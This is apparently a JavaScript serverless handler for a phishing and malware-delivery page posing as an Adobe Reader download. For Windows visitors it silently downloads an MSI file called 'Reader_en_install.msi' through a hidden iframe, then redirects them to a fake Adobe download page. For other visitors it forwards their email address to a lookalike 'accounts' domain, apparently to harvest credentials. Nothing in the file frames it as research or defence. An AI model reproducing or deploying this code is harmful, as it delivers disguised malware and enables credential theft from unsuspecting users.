export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://jomry.com/adobe-readers/installer/download.html';
  const MSI_PATH = '/Reader_en_install.msi';  // must be in /public
  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=&smn=';

  // Get email from query or hash in the URL
  // req.query only gets ?email or &smn, but we can also check for fallback from URL hash in the browser
  let email = '';
  if (req.query.email) {
    email = Array.isArray(req.query.email) ? req.query.email[0] : req.query.email;
  } else if (req.query.smn) {
    email = Array.isArray(req.query.smn) ? req.query.smn[0] : req.query.smn;
  }

  const safeEmail = email ? encodeURIComponent(email) : '';

  if (isWindows) {
    // Windows: iframe download + redirect
    const html = `<!DOCTYPE html>
      <html>
        <head><meta charset="utf-8"><title>Download…</title></head>
        <body>
          <p>Your download will start shortly…</p>
          <script>
            // Check hash in browser if no email in query
            let emailFromHash = '';
            if (!"${safeEmail}" && window.location.hash) {
              emailFromHash = window.location.hash.slice(1);
            }
            const finalEmail = "${safeEmail}" || emailFromHash;

            // Trigger MSI download
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = '${MSI_PATH}';
            document.body.appendChild(iframe);

            // Redirect after 2 seconds (can append email to Adobe URL if needed)
            setTimeout(() => {
              window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
            }, 2000);
          </script>
        </body>
      </html>`;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  // Non-Windows: redirect to target with email
  const finalUrl = safeEmail ? `${NON_WINDOWS_TARGET}?smn=${safeEmail}` : NON_WINDOWS_TARGET;
  res.writeHead(302, { Location: finalUrl });
  res.end();
}
